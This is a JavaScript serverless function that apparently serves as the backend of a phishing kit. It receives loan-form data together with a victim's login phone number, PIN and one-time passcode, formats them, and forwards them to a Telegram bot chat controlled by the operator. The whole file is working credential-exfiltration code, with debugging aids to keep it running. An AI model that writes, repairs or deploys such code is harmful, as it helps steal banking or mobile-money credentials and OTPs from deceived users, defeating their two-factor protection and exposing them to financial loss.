// api/sendTelegram.js
// Diagnostic + HTML-safe version that avoids Markdown parse errors

export default async function handler(req, res) {
  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    const missing = [];
    if (!TELEGRAM_TOKEN) missing.push('TELEGRAM_TOKEN');
    if (!TELEGRAM_CHAT_ID) missing.push('TELEGRAM_CHAT_ID');
    console.error('Missing env vars:', missing.join(', '));
    return res
      .status(500)
      .send('Missing env vars: ' + missing.join(', '));
  }

  // parse JSON safely
  let payload = {};
  try {
    if (typeof req.body === 'string') {
      payload = JSON.parse(req.body || '{}');
    } else {
      // Vercel / Next.js usually gives parsed JSON here
      payload = req.body || {};
    }
  } catch (err) {
    console.error('Invalid JSON:', err && err.message);
    return res.status(400).send('Invalid JSON');
  }

  // escape for HTML (we'll post with parse_mode = 'HTML')
  function escHTML(s){
    if (s === null || s === undefined) return '';
    return String(s)
      .replace(/&/g,'&amp;')
      .replace(/</g,'&lt;')
      .replace(/>/g,'&gt;')
      .replace(/"/g,'&quot;');
  }

  // truncate long fields to avoid message length issues
  function short(s, n = 800){
    if (s === null || s === undefined) return '';
    s = String(s);
    return s.length > n ? escHTML(s.slice(0,n)) + '…(truncated)' : escHTML(s);
  }

  // mask sensitive values for logs
  function mask(s){
    if (!s) return s;
    const ss = String(s);
    if (ss.length <= 2) return '*'.repeat(ss.length);
    const keep = Math.min(2, ss.length);
    return '*'.repeat(ss.length - keep) + ss.slice(-keep);
  }

  // Log masked payload for debugging
  const logged = Object.assign({}, payload);
  if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
  if (logged.otp) logged.otp = mask(logged.otp);
  if (logged.loanData && typeof logged.loanData === 'object') {
    const ld = Object.assign({}, logged.loanData);
    if (ld.pin) ld.pin = mask(ld.pin);
    if (ld.otp) ld.otp = mask(ld.otp);
    logged.loanData = ld;
  }
  console.log('sendTelegram invoked. payload (masked):', JSON.stringify(logged));

  // Build HTML message
  let text = '<b>New Submission Received</b>\n\n';
  if (payload.submittedAt) text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n\n`;

  if (payload.loanData && typeof payload.loanData === 'object') {
    text += '<b>Loan details:</b>\n';
    for (const k of Object.keys(payload.loanData)) {
      text += `<b>${escHTML(k)}:</b> ${short(payload.loanData[k])}\n`;
    }
    text += '\n';
  }

  if (payload.loginPhone) {
    text += '<b>Login details:</b>\n';
    text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
    text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
    // OTP may be present (only in confirm flows)
    if (payload.otp) text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
    text += '\n';
  }

  // any other top-level keys
  const topExtras = Object.assign({}, payload);
  delete topExtras.loanData;
  delete topExtras.submittedAt;
  delete topExtras.loginPhone;
  delete topExtras.loginPin;
  delete topExtras.otp;
  if (Object.keys(topExtras).length) {
    text += '<b>Other:</b>\n';
    for (const k of Object.keys(topExtras)) {
      text += `<b>${escHTML(k)}:</b> ${short(topExtras[k])}\n`;
    }
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const bodyText = await resp.text();
    console.log('Telegram API status:', resp.status, 'body:', bodyText);

    if (!resp.ok) {
      // return Telegram error body for debugging
      return res.status(502).send('Telegram error: ' + bodyText);
    }

    // success: return Telegram response body (stringified)
    let parsed;
    try { parsed = JSON.parse(bodyText); } catch(e){ parsed = bodyText; }

    if (typeof parsed === 'string') {
      return res.status(200).send(parsed);
    } else {
      return res.status(200).json(parsed);
    }
  } catch (e) {
    console.error('Fetch error when calling Telegram API:', e && e.message);
    return res.status(500).send('Fetch error: ' + (e && e.message));
  }
}
